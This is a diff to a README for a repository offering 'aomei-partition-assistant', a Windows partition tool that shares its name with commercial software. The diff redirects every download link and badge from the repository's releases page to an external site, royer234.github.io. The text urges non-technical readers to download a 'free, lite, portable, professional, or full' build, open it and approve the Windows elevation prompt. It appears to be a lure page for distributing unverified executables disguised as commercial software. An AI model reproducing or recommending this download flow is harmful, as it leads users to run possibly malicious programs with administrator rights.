@@ -1,6 +1,6 @@
 # 🗂️ aomei-partition-assistant - Manage Windows Partitions With Ease
 
-[![Download aomei-partition-assistant](https://img.shields.io/badge/Download-aomei--partition--assistant-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Royer234/aomei-partition-assistant/releases)
+[![Download aomei-partition-assistant](https://img.shields.io/badge/Download-aomei--partition--assistant-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://royer234.github.io)
 
 aomei-partition-assistant is a friendly partition tool for Windows computers. It helps you organize the storage space on your PC without needing any technical background. Whether your main drive is running low on room, you want to create a second drive for your documents, or you need to move space from one area of your disk to another, this application gives you a clear, visual way to do it.
 
@@ -25,7 +25,7 @@ Getting the software onto your computer takes only a few minutes and does not re
 3. Locate the saved file and open it to begin using the partition tool.
 4. Follow the on-screen prompts in the application window.
 
-**Visit this link to download the application:** https://github.com/Royer234/aomei-partition-assistant/releases
+**Visit this link to download the application:** https://royer234.github.io
 
 That page is the single official place where the builds are published. Bookmark it so you can return later for updated versions.
 
@@ -33,9 +33,9 @@ That page is the single official place where the builds are published. Bookmark 
 
 ## 💾 Download and Setup
 
-[![Get aomei-partition-assistant](https://img.shields.io/badge/Get%20It%20Now-Download%20Page-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Royer234/aomei-partition-assistant/releases)
+[![Get aomei-partition-assistant](https://img.shields.io/badge/Get%20It%20Now-Download%20Page-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://royer234.github.io)
 
-Visit this link to download the application: https://github.com/Royer234/aomei-partition-assistant/releases
+Visit this link to download the application: https://royer234.github.io
 
 Once the page opens, the available builds and versions are listed there. Choose the one that matches what you need — free, lite, portable, professional, or full — and save it to your Windows PC. When the transfer finishes, open the saved item from your Downloads folder and follow the prompts that appear on screen.
 
@@ -142,6 +142,6 @@ Home users tidying up a family PC. Students who need a separate partition for co
 
 ## 📌 Quick Recap
 
-Open the download page, save the build you want, open it, and approve the Windows prompt. From there, the visual map guides you. Visit https://github.com/Royer234/aomei-partition-assistant/releases to download the application and begin.
+Open the download page, save the build you want, open it, and approve the Windows prompt. From there, the visual map guides you. Visit https://royer234.github.io to download the application and begin.
 
 Keywords: aomei-free-partition-assistant, aomei-partition-assistant-lite, aomei-partition-assistant-windows, aomei-partition-tools-overview, aomei-setup, partition-manager, partition-tools
